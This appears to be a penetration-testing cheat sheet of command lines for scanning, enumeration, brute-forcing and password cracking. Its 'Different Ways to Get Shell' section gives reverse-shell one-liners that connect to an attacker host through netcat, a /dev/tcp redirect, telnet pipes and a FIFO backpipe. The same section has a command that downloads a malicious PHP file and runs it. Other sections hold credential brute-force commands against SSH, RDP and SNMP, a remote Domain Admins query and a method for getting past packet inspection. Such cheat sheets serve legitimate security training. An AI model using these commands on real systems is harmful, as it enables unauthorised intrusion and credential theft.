# **Basic Scanning Tools & Techniques**
**1. Nmap**
```
a. nmap -sC -sV -vv -Pn -p 1-65535 <ip>	#Default_Script#Service version#Verbose#Skip host discovery#port
b. nmap -O <ip>	#Operating System
c. nmap -A <ip>
d. nmap -ssC -sV -vv <ip>
e. nmap -sC --script=smb-enum-users <IP>
f. nmap -T4 --script vuln <ip>	#Awesome#T-Timing(5-high-Fast, 0-low-slow)
```

**2. Wpscan**
```
a. wpscan --url <url> --enumerate p
b. wpscan -u <url> --disable-tls-checks --enumerate ap
c. wpscan --disable-tls-checks --url <url> --enumerate u	#User
d. wpscan --disable-tls-checks --url <url> --enumerate p 	#Plugin
```

**3. Create Server**
```
a. python -m SimpleHTTPServer <Port>
b. wget <url>
c. php -S <localhost:port>
```
**4. Different Ways to Get Shell**
```
# Netcat Bind Shell
a. nc <attacker_ip> <port> -e /bin/bash
#  When the GAPING_SECURITY_HOLE is disabled, meaning you don't have access to -e option of Netcat.
# Create a FIFO file system object and use it as a backpipe to relay standard output from commands piped from netcat to /bin/bash back into netcat. Sounds confusing right? 
	1. mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
c. /bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
d. mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
e. telnet <attacker_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>
f. wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php
```

**5. Bruteforce**
```
a. HTTP Bruteforce - Medusa - intended against htaccess protected web directory.
	1. medusa -h <ip> -u <user> -P passwordfile.txt -M http -m DIIR:/admin -T 10
b. RDP bruteforce - Ncrack
	1. ncrack -vv --user <user> -P passwordfile.txt rdp://ip
c. SNMP Bruteforce - Hydra
	1. hydra -P passwordfile.txt -v <ip> snmp
d. SSH Bruteforce - Hydra
	1. hydra -l <user> -P passwordfile.txt <ip> ssh
e. Ocl Hashcat
	1. ./oclHashcat64.bin -­‐m 110 hash.txt ../big-­‐wordlist.txt -­‐force
f. SSH Tunneling with HTTP encapsulation - so that deep packet inspection check could be bypassed
	1. httptunnel
```
**6. Password Cracking**
```
a. Hashcat
	1. hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```
**7. Nikto**
```
a. nikto -h <url>
```
**8. DIRB**
```
a. dirb <url> -o <outputfile>
```

**9. Enum4Linux**
```
a. enum4linux -a <ip> > enum.txt
b. enum4linux <ip>
```
**10. SMB Scanners**
```
a. smbscan
b. smbclient -L <IP>
c. smbwalk
d. smbmap -u <user> -p <password> -d workgroup -H <IP>
e. smbmap -u '<user>' -p '<password>' -d ACME -H <IP> -x 'net group "Domain Admins" /domain'
f. nmap smb script - nmap -v -sSVC -p 445 --script discovery <IP>
g. nbtscan <ip>
```

**11. SSL Scanners-**
```
a. sslscan
b. sslcert nmap script
c. sslenumcipher nmap script
```
